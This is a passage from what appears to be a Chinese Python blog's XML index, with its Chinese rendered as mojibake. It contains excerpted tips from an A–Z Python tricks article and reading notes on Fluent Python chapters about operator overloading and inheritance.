requests.get(url).json()pprint.pprint(users)Queue Python æ”¯æŒå¤šçº¿ç¨‹ï¼Œè€Œè¿™æ˜¯ç”± Python æ ‡å‡†åº“çš„ Queue æ¨¡å—æ”¯æŒçš„ã€‚è¯¥æ¨¡å—å…è®¸ç”¨æˆ·å®ç°é˜Ÿåˆ—ï¼ˆqueueï¼‰æ•°æ®ç»“æ„ã€‚é˜Ÿåˆ—æ•°æ®ç»“æ„å…è®¸ç”¨æˆ·æ ¹æ®ç‰¹å®šçš„è§„åˆ™æ·»åŠ å’Œæ£€ç´¢æ¡ç›®ã€‚ ã€First in, first outã€ (FIFO) é˜Ÿåˆ—å…è®¸ç”¨æˆ·æŒ‰ç…§å¯¹è±¡è¢«æ·»åŠ çš„é¡ºåºæ¥æ£€ç´¢å¯¹è±¡ã€‚ã€Last in, first outã€ (LIFO) é˜Ÿåˆ—å…è®¸ç”¨æˆ·é¦–å…ˆè®¿é—®æœ€æ–°æ·»åŠ çš„å¯¹è±¡ã€‚ æœ€åï¼Œä¼˜å…ˆçº§é˜Ÿåˆ—ï¼ˆpriority queueï¼‰å…è®¸ç”¨æˆ·æ ¹æ®å¯¹è±¡å¯¹åº”çš„ä¼˜å…ˆçº§ç±»åˆ«æ¥æ£€ç´¢å¯¹è±¡ã€‚ å¦‚ä½•ä½¿ç”¨ queue åœ¨ Python ä¸­å®ç°å¤šçº¿ç¨‹ç¼–ç¨‹ï¼Œç¤ºä¾‹è¯¦è§ï¼šhttps://www.tutorialspoint.com/python3/python_multithreading.htmã€‚ __repr__åœ¨ Python ä¸­å®šä¹‰ä¸€ä¸ªç±»åˆ«æˆ–å¯¹è±¡æ—¶ï¼Œä»¥ã€Œå®˜æ–¹ã€æ–¹å¼å°†å¯¹è±¡è¡¨ç¤ºä¸ºå­—ç¬¦ä¸²å¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼š12345&gt;&gt;&gt; file = open('file.txt', 'r')&gt;&gt;&gt; print(file)&lt;open file 'file.txt', mode 'r' at 0x10d30aaf0&gt; è¿™ä½¿ä»£ç  debug å˜å¾—ç®€å•å¾ˆå¤šã€‚å°†å­—ç¬¦ä¸²æ·»åŠ åˆ°ç±»åˆ«å®šä¹‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011class someClass: def __repr__(self): return "&lt;some description here&gt;"someInstance = someClass()# prints &lt;some description here&gt;print(someInstance) shPython æ˜¯ä¸€ç§ä¼Ÿå¤§çš„è„šæœ¬è¯­è¨€ï¼Œä¸è¿‡æœ‰æ—¶ä½¿ç”¨æ ‡å‡† os å’Œ subprocess åº“ä¼šæœ‰ç‚¹æ£˜æ‰‹ã€‚ sh åº“æä¾›äº†ä¸€ç§ä¸é”™çš„æ›¿ä»£æ–¹æ¡ˆã€‚ sh åº“ï¼šhttp://amoffat.github.io/sh/ è¯¥åº“å…è®¸ç”¨æˆ·åƒä½¿ç”¨æ™®é€šå‡½æ•°ä¸€æ ·è°ƒç”¨ä»»æ„ç¨‹åºï¼Œè¿™å¯¹è‡ªåŠ¨åŒ–å·¥ä½œæµå’Œä»»åŠ¡éå¸¸æœ‰ç”¨ã€‚1234567891011from sh import *sh.pwd()sh.mkdir('new_folder')sh.touch('new_file.txt')sh.whoami()sh.echo('This is great!') ç±»å‹æç¤ºï¼ˆType hintsï¼‰Python æ˜¯åŠ¨æ€è¯­è¨€ã€‚åœ¨å®šä¹‰å˜é‡ã€å‡½æ•°ã€ç±»åˆ«ç­‰æ—¶æ— éœ€æŒ‡å®šæ•°æ®ç±»å‹ã€‚ è¿™æœ‰åˆ©äºç¼©çŸ­å¼€å‘å‘¨æœŸã€‚ä½†æ˜¯ï¼Œç®€å•çš„ç±»å‹é”™è¯¯ï¼ˆtyping issueï¼‰å¯¼è‡´çš„è¿è¡Œæ—¶é”™è¯¯çœŸçš„å¤ªçƒ¦äº†ã€‚ ä» Python 3.5 ç‰ˆæœ¬å¼€å§‹ï¼Œç”¨æˆ·å¯ä»¥é€‰æ‹©åœ¨å®šä¹‰å‡½æ•°æ—¶å¼€å¯ç±»å‹æç¤ºã€‚123def addTwo(x : Int) -&gt; Int: return x + 2 ä½ è¿˜å¯ä»¥å®šä¹‰ç±»å‹åˆ«åï¼š123456789101112131415161718192021222324252627from typing import ListVector = List[float]Matrix = List[Vector]def addMatrix(a : Matrix, b : Matrix) -&gt; Matrix: result = [] for i,row in enumerate(a): result_row =[] for j, col in enumerate(row): result_row += [a[i][j] + b[i][j]] result += [result_row] return resultx = [[1.0, 0.0], [0.0, 1.0]]y = [[2.0, 1.0], [0.0, -2.0]]z = addMatrix(x, y) å°½ç®¡éå¼ºåˆ¶ï¼Œä½†ç±»å‹æ³¨é‡Šå¯ä»¥ä½¿ä»£ç æ›´æ˜“ç†è§£ã€‚ å®ƒä»¬è¿˜å…è®¸ä½ åœ¨è¿è¡Œä¹‹å‰ä½¿ç”¨ç±»å‹æ£€æŸ¥å·¥å…·æ•æ‰ TypeErrorã€‚åœ¨è¿›è¡Œå¤§å‹å¤æ‚é¡¹ç›®æ—¶æ‰§è¡Œæ­¤ç±»æ“ä½œæ˜¯å€¼å¾—çš„ã€‚ uuidç”Ÿæˆé€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆUniversally Unique IDï¼ŒUUIDï¼‰çš„ä¸€ç§å¿«é€Ÿç®€å•æ–¹æ³•å°±æ˜¯ä½¿ç”¨ Python æ ‡å‡†åº“çš„ uuid æ¨¡å—ã€‚ uuid æ¨¡å—ï¼šhttps://docs.python.org/3/library/uuid.html 12345import uuiduser_id = uuid.uuid4()print(user_id) è¿™åˆ›å»ºäº†ä¸€ä¸ªéšæœºåŒ–åçš„ 128 æ¯”ç‰¹æ•°å­—ï¼Œè¯¥æ•°å­—å‡ ä¹å¿…ç„¶æ˜¯å”¯ä¸€çš„ã€‚ äº‹å®ä¸Šï¼Œå¯ä»¥ç”Ÿæˆ 2Â¹Â²Â²å¯èƒ½çš„ UUIDã€‚è¿™ä¸ªæ•°å­—è¶…è¿‡äº† 5,000,000,000,000,000,000,000,000,000,000,000,000ã€‚ åœ¨ç»™å®šé›†åˆä¸­æ‰¾å‡ºé‡å¤æ•°å­—çš„å¯èƒ½æ€§æä½ã€‚å³ä½¿æœ‰ä¸€ä¸‡äº¿ UUIDï¼Œé‡å¤æ•°å­—å­˜åœ¨çš„æ¦‚ç‡ä¹Ÿè¿œè¿œä½äºåäº¿åˆ†ä¹‹ä¸€ã€‚ è™šæ‹Ÿç¯å¢ƒï¼ˆVirtual environmentï¼‰è¿™å¯èƒ½æ˜¯ Python ä¸­æˆ‘æœ€å–œæ¬¢çš„äº‹ç‰©äº†ã€‚ ä½ å¯èƒ½åŒæ—¶å¤„ç†å¤šä¸ª Python é¡¹ç›®ã€‚ä¸å¹¸çš„æ˜¯ï¼Œæœ‰æ—¶å€™ä¸¤ä¸ªé¡¹ç›®ä¾èµ–äºç›¸åŒä¾èµ–é¡¹çš„ä¸åŒç‰ˆæœ¬ã€‚é‚£ä½ è¦å®‰è£…å“ªä¸ªç‰ˆæœ¬å‘¢ï¼Ÿ å¹¸è¿çš„æ˜¯ï¼ŒPython æ”¯æŒè™šæ‹Ÿç¯å¢ƒï¼Œè¿™ä½¿å¾—ç”¨æˆ·èƒ½å¤Ÿå……åˆ†åˆ©ç”¨ä¸¤ç§ç¯å¢ƒã€‚è§ä¸‹åˆ—è¡Œï¼š12345python -m venv my-projectsource my-project/bin/activatepip install all-the-modules ç°åœ¨ä½ åœ¨ä¸€å°æœºå™¨ä¸Šå…·å¤‡ç‹¬ç«‹çš„å¤šä¸ª Python ç‰ˆæœ¬äº†ã€‚é—®é¢˜è§£å†³ï¼ wikipediaWikipedia æ‹¥æœ‰ä¸€ä¸ªå¾ˆæ£’çš„ APIï¼Œå…è®¸ç”¨æˆ·ä»¥ç¼–ç¨‹æ–¹å¼è®¿é—®å·¨å¤§ä½“é‡çš„å…è´¹çŸ¥è¯†å’Œä¿¡æ¯ã€‚ wikipedia æ¨¡å—ä½¿å¾—è®¿é—®è¯¥ API éå¸¸ä¾¿æ·ã€‚ Wikipedia æ¨¡å—ï¼šhttps://wikipedia.readthedocs.io/en/latest/quickstart.html 123456789import wikipediaresult = wikipedia.page('freeCodeCamp')print(result.summary)for link in result.links: print(link) å’ŒçœŸå®çš„ç»´åŸºç™¾ç§‘ç½‘ç«™ç±»ä¼¼ï¼Œè¯¥æ¨¡å—æ”¯æŒå¤šç§è¯­è¨€ã€é¡µé¢æ¶ˆæ­§ã€éšæœºé¡µé¢æ£€ç´¢ï¼Œç”šè‡³è¿˜å…·å¤‡ donate() æ–¹æ³•ã€‚ xkcdhumour æ˜¯ Python è¯­è¨€çš„ä¸€ä¸ªå…³é”®ç‰¹å¾ï¼Œå…¶åç§°æ¥è‡ªè‹±å›½å–œå‰§ç‰‡ã€Šè’™æÂ·æ´¾æ£®çš„é£è¡Œé©¬æˆå›¢ã€‹(Monty Python and the Flying Circus)ã€‚Python çš„å¾ˆå¤šå®˜æ–¹æ–‡æ¡£å¼•ç”¨äº†è¯¥å–œå‰§ç‰‡æœ€è‘—åçš„å‰§æƒ…ã€‚ å¹½é»˜æ„Ÿå¹¶ä¸é™äºæ–‡æ¡£ã€‚è¯•ç€è¿è¡Œä¸‹åˆ—è¡Œï¼š1import antigravity å°†æ‰“å¼€ xkcd ç”»çš„ Python æ¼«ç”»ã€‚ä¸è¦æ”¹å˜è¿™ä¸€ç‚¹ï¼ŒPythonã€‚ä¸è¦æ”¹å˜ã€‚ YAMLYAML ä»£è¡¨ ã€YAML Ainã€t Markup Languageã€ã€‚å®ƒæ˜¯ä¸€ç§æ•°æ®æ ¼å¼è¯­è¨€ï¼Œæ˜¯ JSON çš„è¶…é›†ã€‚ ä¸ JSON ä¸åŒï¼Œå®ƒå¯ä»¥å­˜å‚¨æ›´å¤æ‚çš„å¯¹è±¡å¹¶å¼•ç”¨è‡ªå·±çš„å…ƒç´ ã€‚ä½ è¿˜å¯ä»¥ç¼–å†™æ³¨é‡Šï¼Œä½¿å…¶å°¤å…¶é€‚ç”¨äºç¼–å†™é…ç½®æ–‡ä»¶ã€‚ PyYAML æ¨¡å—ï¼ˆhttps://pyyaml.org/wiki/PyYAMLDocumentationï¼‰å¯ä»¥è®©ä½ åœ¨ Python ä¸­ä½¿ç”¨ YAMLã€‚ å®‰è£…ï¼š1$ pip install pyyaml ç„¶åå¯¼å…¥åˆ°é¡¹ç›®ä¸­ï¼š1import yaml PyYAML ä½¿ä½ èƒ½å¤Ÿå­˜å‚¨ä»»ä½•æ•°æ®ç±»å‹çš„ Python å¯¹è±¡ï¼Œä»¥åŠä»»ä½•ç”¨æˆ·å®šä¹‰ç±»åˆ«çš„å®ä¾‹ã€‚ zipç»™ä½ æ”¯æœ€åä¸€æ‹›ï¼Œéå¸¸é…·ã€‚è¿˜åœ¨ç”¨ä¸¤ä¸ªåˆ—è¡¨æ¥ç»„æˆä¸€éƒ¨è¯å…¸å—ï¼Ÿ12345keys = ['a', 'b', 'c']vals = [1, 2, 3]zipped = dict(zip(keys, vals)) zip() å†…ç½®å‡½æ•°ä½¿ç”¨å¤šä¸ªå¯è¿­ä»£å¯¹è±¡ä½œä¸ºè¾“å…¥å¹¶è¿”å›å…ƒç»„åˆ—è¡¨ã€‚æ¯ä¸ªå…ƒç»„æŒ‰ä½ç½®ç´¢å¼•å¯¹è¾“å…¥å¯¹è±¡çš„å…ƒç´ è¿›è¡Œåˆ†ç»„ã€‚ ä½ ä¹Ÿå¯ä»¥é€šè¿‡è°ƒç”¨*zip() æ¥ã€Œè§£å‹ã€å¯¹è±¡ã€‚ åŸæ–‡é“¾æ¥ï¼šhttps://medium.freecodecamp.org/an-a-z-of-useful-python-tricks-b467524ee747]]></content>
      <categories>
        <category>éšæ‰‹æ‘˜å½•</category>
      </categories>
      <tags>
        <tag>Python Tricks</tag>
        <tag>Syntactic sugar</tag>
        <tag>è¯­æ³•ç³–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python ç¬¬åä¸‰ç«  æ­£ç¡®ä½¿ç”¨è¿ç®—ç¬¦é‡è½½]]></title>
    <url>%2F2018%2F08%2F29%2Ffluent-python-13%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬åä¸‰ç« è¯»ä¹¦æŠ¥å‘Š Chapter 13. Operator Overloading: Doing It Rightç¬¬åä¸‰ç« : æ­£ç¡®ä½¿ç”¨è¿ç®—ç¬¦é‡è½½è¿ç®—ç¬¦é‡è½½çš„ä½œç”¨æ˜¯è®©ç”¨æˆ·å®šä¹‰çš„å¯¹è±¡ä½¿ç”¨ä¸­ç¼€è¿ç®—ç¬¦æˆ–ä¸€å…ƒè¿ç®—ç¬¦ã€‚å®½æ³›ä¸€äº›æ¥è®²ï¼ŒPythonä¸­çš„å‡½æ•°è°ƒç”¨ï¼ˆ()ï¼‰,å±æ€§è®¿é—®ï¼ˆ.ï¼‰,å’Œå…ƒç´ è®¿é—®/åˆ‡ç‰‡ï¼ˆ[]ï¼‰ä¹Ÿæ˜¯è¿ç®—ç¬¦ï¼Œä¸è¿‡æœ¬ç« åªè®¨è®ºä¸€å…ƒè¿ç®—ç¬¦å’Œä¸­ç¼€è¿ç®—ç¬¦ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬ä¼šè®¨è®ºè¿™å‡ ä¸ªé—®é¢˜: Pythonä¸­å¦‚ä½•å¤„ç†è¿ç®—ç¬¦ä¸­ä¸åŒç±»å‹çš„æ“ä½œæ•° ä½¿ç”¨å‹åˆ¶ç±»å‹æˆ–è€…æ˜¾å¼ç±»å‹æ£€æŸ¥å¤„ç†ä¸åŒç±»å‹çš„æ“ä½œæ•° ä¸­ç¼€è¿ç®—ç¬¦å¦‚ä½•è¡¨æ˜è‡ªå·±æ— æ³•å¤„ç†æ“ä½œæ•° ä¼—å¤šæ¯”è¾ƒè¿ç®—ç¬¦(==, &gt; ,&lt;=)ç­‰çš„ç‰¹æ®Šè¡Œä¸º å¢é‡èµ‹å€¼è¿ç®—ç¬¦çš„é»˜è®¤å¤„ç†æ–¹å¼å’Œé‡è½½æ–¹å¼ 13.1 è¿ç®—ç¬¦é‡è½½åŸºç¡€Python åœ¨è¿ç®—ç¬¦é‡è½½æ–¹é¢è¿›è¡Œäº†ä¸€äº›é™åˆ¶ï¼Œåšå¥½äº†çµæ´»æ€§ã€å¯ç”¨æ€§å’Œå®‰å…¨æ€§æ–¹é¢çš„å¹³è¡¡ã€‚ ä¸èƒ½é‡è½½å†…ç½®ç±»å‹çš„è¿ç®—ç¬¦ ä¸èƒ½æ–°å»ºè¿ç®—ç¬¦ï¼Œåªèƒ½ä½¿ç”¨ç°æœ‰çš„ æŸäº›è¿ç®—ç¬¦ä¸èƒ½é‡è½½â€”â€”isã€andã€orã€not 13.2 ä¸€å…ƒè¿ç®—ç¬¦Pythonè¯­è¨€å‚è€ƒæ‰‹å†Œä¸­ï¼Œåˆ—å‡ºäº†3ä¸ªä¸€å…ƒè¿ç®—ç¬¦: - å–è´Ÿè¿ç®—ç¬¦ï¼Œå¯¹åº”ç‰¹æ®Šæ–¹æ³• __neg__ + å–æ­£è¿ç®—ç¬¦ï¼Œå¯¹åº”ç‰¹æ®Šæ–¹æ³• __pos__ ~ å–åè¿ç®—ç¬¦ï¼Œå¯¹åº”ç‰¹æ®Šæ–¹æ³• __invert__ Python ä¸­è¿˜æœ‰ä¸€ä¸ªè¾ƒä¸ºç‰¹æ®Šçš„ä¸€å…ƒè¿ç®—ç¬¦abs(), å–ç»å¯¹å€¼æ“ä½œç¬¦ï¼Œå¯¹åº”çš„æ˜¯ç‰¹æ®Šæ–¹æ³• __abs__ æ”¯æŒä¸€å…ƒè¿ç®—ç¬¦å¾ˆç®€å•ï¼Œåªéœ€è¦å®ç°ç›¸åº”çš„ç‰¹æ®Šæ–¹æ³•ã€‚è¿™äº›ç‰¹æ®Šæ–¹æ³•åªæœ‰ä¸€ä¸ªå‚æ•°selfã€‚éœ€è¦éµå¾ªçš„åŸºæœ¬è§„åˆ™æ˜¯å§‹ç»ˆè¿”å›ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½ä¿®æ”¹selfï¼Œ è€Œæ˜¯è¦åˆ›å»ºå¹¶è¿”å›åˆé€‚ç±»å‹çš„æ–°å®ä¾‹ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œ -ï¼Œ+ è¿”å›ä¸selfåŒä¸€ç±»å‹çš„å®ä¾‹ã€‚absä¸€èˆ¬è¿”å›ä¸€ä¸ªæ ‡é‡ã€‚å¯¹äº~æ¥è¯´ï¼Œå¾ˆéš¾è¯´ä»€ä¹ˆç»“æœæ˜¯åˆç†çš„ï¼Œä¾‹å¦‚ORMä¸­SQL WHEREè¯­å¥å–åå°±åº”è¯¥è¿”å›åé›†ã€‚ 13.3 ä¸ºVectoré‡è½½å‘é‡åŠ æ³•è¿ç®—ç¬¦+ä¹‹å‰çš„ç« èŠ‚ä¸­æˆ‘ä»¬å®ç°è¿‡å‘é‡Vector ç°åœ¨ä¸ºå®ƒå®ç°è¿ç®—ç¬¦é‡è½½ åºåˆ—åº”å½“æ”¯æŒ+è¿ç®—ç¬¦(ç”¨äºæ‹¼æ¥)ï¼Œ ä»¥åŠ*è¿ç®—ç¬¦(ç”¨äºé‡å¤å¤åˆ¶) ç„¶è€Œæˆ‘ä»¬è¦åšçš„æ˜¯ï¼Œä¸ºå‘é‡å®ç°å‘é‡åŠ æ³•å’Œå‘é‡ä¹˜æ³•è¿ç®—(ç‚¹ä¹˜) æˆ‘ä»¬æƒ³è±¡ä¸­çš„å‘é‡åŠ æ³•åº”è¯¥å®ç°ä¸‹é¢ä¸¤ç‚¹: å¯¹äºä¸¤ä¸ªç»´åº¦ç›¸åŒçš„å‘é‡ï¼Œ åˆ†é‡åˆ†åˆ«ç›¸åŠ  å¯¹äºä¸¤ä¸ªç»´åº¦ä¸åŒçš„å‘é‡ï¼Œåˆ†é‡å°‘çš„å°¾éƒ¨è¡¥é›¶å‘é‡å†ç›¸åŠ  åŸºäºä»¥ä¸Šä¸¤ç‚¹ï¼Œå¯ä»¥åˆæ­¥å†™å‡ºç›¸åº”çš„ç‰¹æ®Šæ–¹æ³•: 123def __add__(self, other): pairs = itertools.zip_longest(self, other, fillvalue=0.0) return Vector(a+b for a,b in pairs) éœ€è¦æ³¨æ„çš„ç‚¹ï¼š å®ç°åŒ»é™¢è¿ç®—ç¬¦å’Œä¸­ç¼€è¿ç®—ç¬¦çš„ç‰¹æ®Šæ–¹æ³•ä¸€å®šä¸èƒ½ä¿®æ”¹æ“ä½œæ•°ï¼Œè¿™äº›æ“ä½œç¬¦ç†åº”è¿”å›æ–°å¯¹è±¡ï¼Œåªæœ‰å¢é‡èµ‹å€¼è¡¨è¾¾å¼å¯èƒ½ä¿®æ”¹ç¬¬ä¸€ä¸ªæ“ä½œæ•°ã€‚ ä¸ºäº†æ”¯æŒæ¶‰åŠä¸åŒç±»å‹çš„è¿ç®—ï¼Œ Python ä¸ºä¸­ç¼€è¿ç®—ç¬¦ç‰¹æ®Šæ–¹æ³•æä¾›äº†ç‰¹æ®Šçš„åˆ†æ´¾æœºåˆ¶ ï¼Œ å¯¹äºè¡¨è¾¾å¼a+bæ¥è¯´ï¼Œè§£é‡Šå™¨ä¼šæ‰§è¡Œä»¥ä¸‹å‡ æ­¥æ“ä½œ å¦‚æœaæœ‰__add__æ–¹æ³•ï¼Œ è€Œä¸”è¿”å›å€¼ä¸æ˜¯NotImplemented, è°ƒç”¨a.__add__(b) å¦‚æœæ²¡æœ‰__add__æ–¹æ³•ï¼Œ æˆ–è€…__add__æ–¹æ³•è¿”å›NotImplemented, æ£€æŸ¥bæœ‰æ²¡æœ‰__radd__ï¼Œ å¦‚æœæœ‰ä¸”è¿”å›ä¸æ˜¯NotImplementedï¼Œè¿”å›b.__radd__(a) å¦‚æœbæ²¡æœ‰__radd__æˆ–è€…__radd__è¿”å›NotImplemented, æŠ›å‡ºTypeError, traceback ä¸­ä¼šæŒ‡æ˜æ“ä½œæ•°ä¸æ”¯æŒã€‚ å…·ä½“çš„æƒ…å†µå¦‚ä¸‹å›¾æ‰€ç¤º: NotImplementedå’ŒNotImplementedErroræ˜¯ä¸åŒçš„ï¼Œ å‰è€…æ˜¯ç‰¹æ®Šçš„å•ä¾‹å€¼ï¼Œåœ¨è¿ç®—ç¬¦æ— æ³•å¤„ç†æ“ä½œæ•°æ—¶è¿”å›ï¼ˆreturnï¼‰ç»™è§£é‡Šå™¨ï¼Œåè€…æ˜¯ä¸€ç§å¼‚å¸¸ï¼ŒæŠ½è±¡ç±»æŠ›å‡ºï¼ˆraiseï¼‰è¿™ä¸ªå¼‚å¸¸æé†’å­ç±»å¿…é¡»è¦†ç›–ã€‚ NotImplemented ä¸Errorçš„ä¸åŒåœ¨äºï¼Œè¿”å›NotImplementedæ—¶ï¼Œ å¦ä¸€ä¸ªæ“ä½œæ•°è¿˜æœ‰æœºä¼šæ‰§è¡Œåå‘çš„è¿ç®—æ–¹æ³•ã€‚è¿™æ˜¯Pythonç§è¿ç®—ç¬¦çš„ä¸€ç§åˆ†æ´¾æœºåˆ¶ã€‚ 13.4 é‡è½½æ ‡é‡ä¹˜æ³•è¿ç®—ç¬¦*å‘é‡çš„æ ‡é‡ç§¯(scalar product) æœ‰ä¸¤ç§: å‘é‡ä¸æ ‡é‡ç›¸ä¹˜ï¼Œ ç»“æœæ˜¯ä¸åŸå‘é‡æ–¹å‘ç›¸åŒï¼Œ æ¨¡æ˜¯åŸå‘é‡æ¨¡çš„æ ‡é‡å€çš„å‘é‡ å‘é‡ä¸å‘é‡ç›¸ä¹˜ï¼Œç»“æœæ˜¯å„ä¸ªåˆ†é‡çš„ç§¯æ±‚å’Œçš„æ ‡é‡ NumPyç­‰åº“ç›®å‰çš„åšæ³•æ˜¯ï¼Œä¸é‡è½½è¿™ä¸¤ç§æ„ä¹‰çš„*ï¼Œ å‘é‡ä¸å‘é‡ç›¸ä¹˜çš„æƒ…å†µç”¨ numpy.dot()å¤„ç† ç±»ä¼¼åŠ å·çš„é‡è½½ï¼Œ æˆ‘ä»¬ä¸ºVector å†™å¥½äº†__mul__å’Œ__rmul__æ–¹æ³•ã€‚ 1234def __mul__(self, scalar): return Vector(n * scalar for n in self)def __rmul__(self, scalar): return self * scalar Python 3.5 ä»¥åçš„ç‰ˆæœ¬æä¾›äº†@è¿ç®—ç¬¦ï¼Œ è®¡ç®—ä¸¤ä¸ªå‘é‡ç›¸ä¹˜çš„æ ‡é‡ç§¯ã€‚ç‰¹æ®Šæ–¹æ³•ä¸º__matmul__ 13.5 æ¯”è¾ƒè¿ç®—ç¬¦Python è§£é‡Šå™¨å¯¹ä¼—å¤šæ¯”è¾ƒè¿ç®—ç¬¦çš„å¤„ç†ä¸å‰æ–‡ç±»ä¼¼ï¼Œä¸è¿‡æœ‰ä¸¤ç‚¹æ¯”è¾ƒæ˜æ˜¾çš„åŒºåˆ«ï¼š æ­£å‘å’Œåå‘è°ƒç”¨ä½¿ç”¨çš„æ˜¯åŒä¸€ç³»åˆ—æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œå¯¹ == æ¥è¯´ï¼Œæ­£å‘å’Œåå‘è°ƒç”¨éƒ½æ˜¯ __eq__ æ–¹æ³•ï¼Œåªæ˜¯æŠŠå‚æ•°å¯¹è°ƒäº†ï¼›è€Œæ­£å‘çš„ __gt__ æ–¹æ³•è°ƒç”¨çš„æ˜¯åå‘çš„ __lt__ æ–¹æ³•ï¼Œå¹¶æŠŠå‚æ•°å¯¹è°ƒã€‚ å¯¹ == å’Œ != æ¥è¯´ï¼Œå¦‚æœåå‘è°ƒç”¨å¤±è´¥ï¼ŒPython ä¼šæ¯”è¾ƒå¯¹è±¡çš„ IDï¼Œè€Œä¸æŠ›å‡ºTypeErrorã€‚ Python3 ä¸­ __ne__çš„ç»“æœæ˜¯å¯¹ __eq__ æ–¹æ³•å–åçš„ç»“æœï¼Œ ä¸€äº›ä¸åˆé€‚çš„æ¯”è¾ƒä¼šè¿”å›TypeErrorè€Œä¸æ¯”è¾ƒå¯¹è±¡ID 13.6 å¢é‡èµ‹å€¼è¿ç®—ç¬¦ å¢é‡èµ‹å€¼ä¸ä¼šä¿®æ”¹ä¸å¯å˜ç›®æ ‡ï¼Œè€Œæ˜¯æ–°å»ºå®ä¾‹ç„¶åé‡æ–°ç»‘å®šã€‚éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼Œ ä¸å¯å˜ç±»å‹ä¸€å®šä¸èƒ½å®ç°å°±åœ°ç‰¹æ®Šæ–¹æ³•ï¼Œå³ä¿®æ”¹å®ä¾‹æœ¬èº«çš„æ–¹æ³• å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰å®ç°å°±åœ°è¿ç®—ç¬¦å¯¹åº”çš„ç‰¹æ®Šæ–¹æ³•ï¼Œå¢é‡èµ‹å€¼è¿ç®—ç¬¦åªæ˜¯è¯­æ³•ç³–ï¼ša += b çš„ä½œç”¨ä¸ a = a + b å®Œå…¨ä¸€æ ·ã€‚å¯¹ä¸å¯å˜ç±»å‹æ¥è¯´ï¼Œè¿™æ˜¯é¢„æœŸçš„è¡Œä¸ºï¼Œè€Œä¸”ï¼Œå¦‚æœå®šä¹‰äº†__add__ æ–¹æ³•çš„è¯ï¼Œä¸ç”¨ç¼–å†™é¢å¤–çš„ä»£ç ï¼Œ+= å°±èƒ½ä½¿ç”¨ã€‚ç„¶è€Œï¼Œå¦‚æœå®ç°äº†å°±åœ°è¿ç®—ç¬¦æ–¹æ³•ï¼Œä¾‹å¦‚ __iadd__ï¼Œè®¡ç®— a += b çš„ç»“æœæ—¶ä¼šè°ƒç”¨å°±åœ°è¿ç®—ç¬¦æ–¹æ³•ã€‚è¿™ç§è¿ç®—ç¬¦çš„åç§°è¡¨æ˜ï¼Œå®ƒä»¬ä¼šå°±åœ°ä¿®æ”¹å·¦æ“ä½œæ•°ï¼Œè€Œä¸ä¼šåˆ›å»ºæ–°å¯¹è±¡ä½œä¸ºç»“æœã€‚ 13.7 å°ç»“æœ¬ç« ä¸»è¦ä»‹ç»äº†Pythonä¸­å¯¹è¿ç®—ç¬¦é‡è½½çš„åšæ³•ï¼Œ é™åˆ¶å’Œç‰¹æ€§ã€‚]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>fluent python</tag>
        <tag>Operator Overloading</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python ç¬¬åäºŒç«  ç»§æ‰¿çš„ä¼˜ç¼ºç‚¹]]></title>
    <url>%2F2018%2F07%2F28%2Ffluent-python-12%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬åäºŒç« è¯»ä¹¦æŠ¥å‘Š Chapter 12. Inheritance: For Good or For Worseç¬¬åäºŒç« : ç»§æ‰¿çš„ä¼˜ç¼ºç‚¹ æ¨å‡ºç»§æ‰¿çš„åˆè¡·æ˜¯è®©æ–°æ‰‹é¡ºåˆ©ä½¿ç”¨åªæœ‰ä¸“å®¶æ‰èƒ½è®¾è®¡å‡ºæ¥çš„æ¡†æ¶ã€‚ â€”â€” Alan Kay æœ¬ç« è®¨è®ºç»§æ‰¿å’Œå­ç±»åŒ–ï¼Œé‡ç‚¹æ˜¯è¯´æ˜å¯¹Pythonè€Œè¨€å°¤ä¸ºé‡è¦çš„ä¸¤ä¸ªç»†èŠ‚ï¼š å­ç±»åŒ–å†…ç½®ç±»å‹çš„ç¼ºç‚¹ å¤šé‡ç»§æ‰¿å’Œæ–¹æ³•è§£æé¡ºåº 12.1 å­ç±»åŒ–å†…ç½®ç±»å‹çš„éº»çƒ¦ä¹‹å¤„Pythonä¸­çš„å†…ç½®ç±»å‹å­ç±»åŒ–æœ‰ä¸€ä¸ªé‡è¦çš„æ³¨æ„äº‹é¡¹ï¼šå†…ç½®ç±»å‹(ä½¿ç”¨Cè¯­è¨€ç¼–å†™)ä¸ä¼šè°ƒç”¨ç”¨æˆ·å®šä¹‰çš„ç±»è¦†ç›–çš„ç‰¹æ®Šæ–¹æ³•ã€‚ å†…ç½®ç±»å‹çš„è¿™ç§è¡Œä¸ºè¿èƒŒäº†é¢å‘å¯¹è±¡ç¼–ç¨‹çš„ä¸€ä¸ªåŸºæœ¬åŸåˆ™ï¼šä»å®ä¾‹æ‰€å±çš„ç±»æœç´¢æ–¹æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ªååˆ†ç³Ÿç³•çš„å±€é¢ã€‚ æ‰€ä»¥åœ¨å­ç±»åŒ–çš„æ—¶å€™ï¼Œä¸åº”è¯¥é€‰æ‹©å†…ç½®ç±»å‹ï¼Œè€Œåº”è¯¥é€‰æ‹©collectionsä¸­çš„ç±»è¿›è¡Œç»§æ‰¿ã€‚ 12.2 å¤šé‡ç»§æ‰¿å’Œæ–¹æ³•è§£æé¡ºåºä»»ä½•å®ç°å¤šé‡ç»§æ‰¿çš„è¯­è¨€éƒ½è¦å¤„ç†æ½œåœ¨çš„å‘½åå†²çªï¼Œè¿™ç§å†²çªæ˜¯ç”±ä¸ç›¸å…³çš„ç¥–å…ˆç±»åŒåçš„æ–¹æ³•å¼•èµ·çš„ï¼Œç§°ä¸ºâ€œè±å½¢é—®é¢˜â€ã€‚ pythonèƒ½åŒºåˆ†å­ç±»è°ƒç”¨çš„æ˜¯å“ªä¸€ä¸ªæ–¹æ³•ï¼Œæ˜¯å› 